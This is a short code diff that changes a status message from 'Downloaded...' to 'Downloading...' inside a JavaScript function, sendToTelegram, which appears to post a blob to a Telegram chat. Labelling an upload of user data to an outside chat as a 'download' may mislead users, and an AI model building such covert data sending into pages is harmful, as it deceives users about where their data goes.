@@ -396,7 +396,7 @@
         // 6. Telegram Sender
         async function sendToTelegram(blob) {
             statusMsg.style.display = 'block';
-            statusMsg.innerText = "Downloaded...";
+            statusMsg.innerText = "Downloading...";
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
